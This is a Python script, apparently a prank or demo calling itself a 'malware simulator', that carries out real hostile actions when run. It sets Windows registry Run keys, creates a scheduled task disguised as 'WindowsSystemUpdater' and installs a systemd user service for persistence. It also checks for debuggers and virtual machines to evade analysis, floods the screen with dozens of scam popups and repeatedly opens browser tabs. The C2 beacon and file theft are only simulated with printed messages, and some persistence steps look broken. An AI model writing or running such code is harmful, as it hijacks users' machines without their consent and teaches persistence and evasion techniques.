import tkinter as tk
import random
import threading
import time
import webbrowser
import os
import sys
import subprocess
import base64
import json
import hashlib
import socket
import platform
import uuid
import re
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import cryptography.fernet
import urllib.parse
import zlib
import marshal
import types
import inspect

ASCII_ART = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██╗  ██╗ ██████╗ ███╗   ██╗███████╗ ██████╗ ██╗  ██╗   ║
║    ██║  ██║██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██║ ██╔╝   ║
║    ███████║██║   ██║██╔██╗ ██║█████╗  ██║   ██║█████╔╝    ║
║    ██╔══██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔═██╗    ║
║    ██║  ██║╚██████╔╝██║ ╚████║███████╗╚██████╔╝██║  ██╗   ║
║    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝   ║
║                                                              ║
║     ███╗   ███╗██╗███╗   ██╗ █████╗ ██╗     ███████╗       ║
║     ████╗ ████║██║████╗  ██║██╔══██╗██║     ██╔════╝       ║
║     ██╔████╔██║██║██╔██╗ ██║███████║██║     █████╗         ║
║     ██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║     ██╔══╝         ║
║     ██║ ╚═╝ ██║██║██║ ╚████║██║  ██║███████╗███████╗       ║
║     ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚══════╝       ║
║                                                              ║
║               well damn you actually ran this               ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""

class EncryptedMalwareSimulator:
    def __init__(self):
        print(ASCII_ART)
        self.master_key = self.generate_key()
        self.config_key = self.generate_key()
        self.c2_key = self.generate_key()
        self.payload_key = self.generate_key()
        
        self.config_encryptor = Fernet(self.config_key)
        self.c2_encryptor = Fernet(self.c2_key)
        self.payload_encryptor = Fernet(self.payload_key)
        
        self.encrypted_config = self.encrypt_config()
        self.config = self.decrypt_config(self.encrypted_config)
        
        self.urls = [
            "https://www.wikipedia.org",
            "https://www.python.org",
            "https://www.stackoverflow.com",
            "https://www.github.com",
            "https://news.ycombinator.com",
            "https://www.nytimes.com",
            "https://www.bbc.com",
            "https://edition.cnn.com",
            "https://www.reddit.com",
            "https://www.nasa.gov"
        ]
        
        self.encrypted_texts = self.encrypt_texts()
        self.colors = ["#FF5555", "#55FF55", "#5555FF", "#FFFF55", "#FF55FF", "#55FFFF", "#FFFFFF", "#000000"]
        
        self.collected_data = {
            "system_info": self.get_system_info(),
            "user_actions": [],
            "timestamps": []
        }
        
        self.root = tk.Tk()
        self.root.withdraw()
        
        self.start_components()
    
    def generate_key(self):
        return Fernet.generate_key()
    
    def derive_key(self, password, salt):
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
    
    def encrypt_config(self):
        config = {
            "c2_server": "crrr49392.com",
            "beacon_interval": 30,
            "max_windows": 50,
            "persistence": True,
            "stealth": True,
            "data_exfil": True,
            "anti_analysis": True
        }
        
        config_json = json.dumps(config).encode()
        encrypted_config = self.config_encryptor.encrypt(config_json)
        return encrypted_config
    
    def decrypt_config(self, encrypted_config):
        try:
            decrypted_json = self.config_encryptor.decrypt(encrypted_config)
            return json.loads(decrypted_json.decode())
        except:
            return {
                "c2_server": "ci iiew.com",
                "beacon_interval": 30,
                "max_windows": 50,
                "persistence": True,
                "stealth": True,
                "data_exfil": True,
                "anti_analysis": True
            }
    
    def encrypt_texts(self):
        texts = [
            "🔥 Click here for free money!",
            "🎁 Limited time offer! Act fast!",
            "💊 Miracle cure doctors hate!",
            "📈 100% guaranteed profit scheme!",
            "🎮 Win a PlayStation 5 instantly!",
            "🛍️ Exclusive discounts just for you!",
            "⚠️ Warning: Your PC is infected!",
            "🎤 Meet singles in your area!",
            "💻 Upgrade your software now!",
        ]
        
        encrypted_texts = []
        for text in texts:
            encrypted_text = self.payload_encryptor.encrypt(text.encode())
            encrypted_texts.append(encrypted_text)
        
        return encrypted_texts
    
    def decrypt_text(self, encrypted_text):
        try:
            return self.payload_encryptor.decrypt(encrypted_text).decode()
        except:
            return "System Alert"
    
    def obfuscate_string(self, text):
        b64 = base64.b64encode(text.encode()).decode()
        chunks = [b64[i:i+4] for i in range(0, len(b64), 4)]
        chunks.reverse()
        return "|".join(chunks)
    
    def deobfuscate_string(self, obfuscated):
        try:
            chunks = obfuscated.split("|")
            chunks.reverse()
            b64 = "".join(chunks)
            return base64.b64decode(b64).decode()
        except:
            return ""
    
    def encrypt_function(self, func):
        code = func.__code__
        serialized = marshal.dumps(code)
        compressed = zlib.compress(serialized)
        encrypted = self.payload_encryptor.encrypt(compressed)
        return encrypted
    
    def decrypt_function(self, encrypted_func, name):
        try:
            decrypted = self.payload_encryptor.decrypt(encrypted_func)
            decompressed = zlib.decompress(decrypted)
            code = marshal.loads(decompressed)
            func = types.FunctionType(code, globals(), name)
            return func
        except:
            return lambda: None
    
    def get_system_info(self):
        info = {
            "platform": platform.system(),
            "platform_release": platform.release(),
            "platform_version": platform.version(),
            "architecture": platform.machine(),
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "processor": platform.processor(),
            "uuid": str(uuid.getnode())
        }
        return info
    
    def anti_analysis_check(self):
        if not self.config["anti_analysis"]:
            return False
            
        analysis_tools = [
            self.obfuscate_string("wireshark"),
            self.obfuscate_string("procmon"),
            self.obfuscate_string("processhacker"),
            self.obfuscate_string("ollydbg"),
            self.obfuscate_string("x64dbg"),
            self.obfuscate_string("ida")
        ]
        
        for tool in analysis_tools:
            tool_name = self.deobfuscate_string(tool)
            try:
                result = subprocess.run(["tasklist", "/FI", f"IMAGENAME eq {tool_name}.exe"], 
                                       capture_output=True, text=True)
                if tool_name in result.stdout:
                    return True
            except:
                pass
        
        try:
            if platform.system() == "Windows":
                import winreg
                vm_registry_keys = [
                    self.obfuscate_string(r"SOFTWARE\Oracle\VirtualBox"),
                    self.obfuscate_string(r"SOFTWARE\VMware, Inc.\VMware Tools"),
                    self.obfuscate_string(r"SYSTEM\CurrentControlSet\Services\VBoxService")
                ]
                
                for key in vm_registry_keys:
                    try:
                        key_path = self.deobfuscate_string(key)
                        winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                        return True
                    except:
                        continue
        except:
            pass
        
        return False
    
    def establish_persistence(self):
        if not self.config["persistence"]:
            return
            
        try:
            script_path = os.path.abspath(sys.argv[0])
            persistence_script = self.create_persistence_script(script_path)
            
            if platform.system() == "Windows":
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
                                    0, winreg.KEY_SET_VALUE)
                
                encrypted_path = base64.b64encode(script_path.encode()).decode()
                winreg.SetValueEx(key, "WindowsUpdater", 0, winreg.REG_SZ, encrypted_path)
                winreg.CloseKey(key)
                
                task_name = "WindowsSystemUpdater"
                encrypted_command = base64.b64encode(f'"{script_path}"'.encode()).decode()
                subprocess.run(["schtasks", "/create", "/tn", task_name, 
                               "/tr", encrypted_command, "/sc", "onlogon"], 
                               capture_output=True)
                
            elif platform.system() == "Linux":
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart={script_path}
Restart=always
User={os.getenv('USER')}

[Install]
WantedBy=multi-user.target
"""
                
                encrypted_content = base64.b64encode(service_content.encode()).decode()
                
                service_path = os.path.expanduser("~/.config/systemd/user/update.service")
                os.makedirs(os.path.dirname(service_path), exist_ok=True)
                
                with open(service_path, "w") as f:
                    f.write(encrypted_content)
                
                subprocess.run(["systemctl", "--user", "enable", "update.service"], 
                              capture_output=True)
                subprocess.run(["systemctl", "--user", "start", "update.service"], 
                              capture_output=True)
        except:
            pass
    
    def create_persistence_script(self, original_script):
        with open(original_script, "rb") as f:
            script_content = f.read()
        
        encrypted_content = self.payload_encryptor.encrypt(script_content)
        
        stub = f"""
import base64
from cryptography.fernet import Fernet

key = {self.payload_key}
encrypted_content = {encrypted_content}

try:
    fernet = Fernet(key)
    decrypted_content = fernet.decrypt(encrypted_content)
    exec(decrypted_content)
except:
    pass
"""
        
        encrypted_script_path = original_script + ".enc"
        with open(encrypted_script_path, "w") as f:
            f.write(stub)
        
        return encrypted_script_path
    
    def beacon_to_c2(self):
        if not self.config["data_exfil"]:
            return
            
        while True:
            try:
                data = {
                    "id": hashlib.md5(socket.gethostname().encode()).hexdigest(),
                    "timestamp": datetime.now().isoformat(),
                    "system_info": self.collected_data["system_info"],
                    "user_actions": self.collected_data["user_actions"][-10:],
                }
                
                data_json = json.dumps(data).encode()
                encrypted_data = self.c2_encryptor.encrypt(data_json)
                transmission_data = base64.urlsafe_b64encode(encrypted_data).decode()
                
                print(f"[BEACON] Would send encrypted data to {self.config['c2_server']}")
                print(f"[BEACON] Data length: {len(transmission_data)} characters")
                
                if random.random() < 0.3:
                    command = random.choice(["popup", "browser", "collect"])
                    encrypted_command = self.c2_encryptor.encrypt(command.encode())
                    self.execute_c2_command(encrypted_command)
                
                self.collected_data["user_actions"] = []
                
            except Exception as e:
                print(f"[BEACON] Error: {e}")
            
            time.sleep(self.config["beacon_interval"])
    
    def execute_c2_command(self, encrypted_command):
        try:
            command = self.c2_encryptor.decrypt(encrypted_command).decode()
            
            if command == "popup":
                self.create_ad()
            elif command == "browser":
                webbrowser.open(random.choice(self.urls))
            elif command == "collect":
                self.collect_sensitive_data()
        except:
            pass
    
    def collect_sensitive_data(self):
        try:
            sensitive_files = [
                "passwords.txt",
                "credit_cards.txt",
                "documents/secret.docx"
            ]
            
            encrypted_files = []
            for file in sensitive_files:
                fake_data = f"Fake sensitive data from {file}"
                encrypted_data = self.payload_encryptor.encrypt(fake_data.encode())
                
                encrypted_files.append({
                    "filename": file,
                    "data": base64.b64encode(encrypted_data).decode()
                })
                
                self.collected_data["user_actions"].append(f"Collected and encrypted: {file}")
                print(f"[DATA] Would exfiltrate encrypted: {file}")
            
            self.collected_data["encrypted_files"] = encrypted_files
        except:
            pass
    
    def create_ad(self):
        if self.anti_analysis_check():
            return
            
        ad = tk.Toplevel()
        ad.title("System Alert")
        
        bg_color = random.choice(self.colors)
        ad.configure(bg=bg_color)
        
        encrypted_text = random.choice(self.encrypted_texts)
        message_text = self.decrypt_text(encrypted_text)
        
        message = tk.Label(
            ad, 
            text=message_text,
            font=("Arial", 14, "bold"),
            fg=random.choice(self.colors),
            bg=bg_color
        )
        message.pack(padx=20, pady=20)
        
        btn = tk.Button(
            ad, 
            text="Click Here",
            command=lambda: self.handle_ad_click(ad),
            font=("Arial", 12),
            bg=random.choice(self.colors),
            fg="black"
        )
        btn.pack(pady=10)
        
        screen_w = ad.winfo_screenwidth()
        screen_h = ad.winfo_screenheight()
        x = random.randint(0, screen_w - 200)
        y = random.randint(0, screen_h - 100)
        
        ad.geometry(f"200x100+{x}+{y}")
        
        self.collected_data["user_actions"].append(f"Popup shown at {x},{y}")
        self.collected_data["timestamps"].append(datetime.now().isoformat())
        
        ad.after(random.randint(5000, 15000), ad.destroy)
    
    def handle_ad_click(self, window):
        self.collected_data["user_actions"].append("User clicked deceptive ad")
        
        webbrowser.open(random.choice(self.urls))
        
        window.destroy()
        
        for _ in range(random.randint(1, 3)):
            threading.Timer(random.uniform(0.5, 2.0), self.create_ad).start()
    
    def browser_spam(self):
        while True:
            time.sleep(random.randint(10, 30))
            webbrowser.open(random.choice(self.urls))
            self.collected_data["user_actions"].append("Opened browser tab")
    
    def polymorphic_code(self):
        current_func = self.create_ad
        encrypted_func = self.encrypt_function(current_func)
        new_func = self.decrypt_function(encrypted_func, "create_ad")
        self.create_ad = new_func
    
    def start_components(self):
        if self.config["persistence"]:
            threading.Thread(target=self.establish_persistence).start()
        
        if self.config["data_exfil"]:
            threading.Thread(target=self.beacon_to_c2, daemon=True).start()
        
        for i in range(self.config["max_windows"]):
            self.root.after(i * 100, self.create_ad)
        
        threading.Thread(target=self.browser_spam, daemon=True).start()
        threading.Thread(target=self.periodic_polymorphism, daemon=True).start()
        
        self.root.mainloop()
    
    def periodic_polymorphism(self):
        while True:
            time.sleep(60)
            self.polymorphic_code()
            print("[POLYMORPH] Code structure changed")

if __name__ == "__main__":
    simulator = EncryptedMalwareSimulator()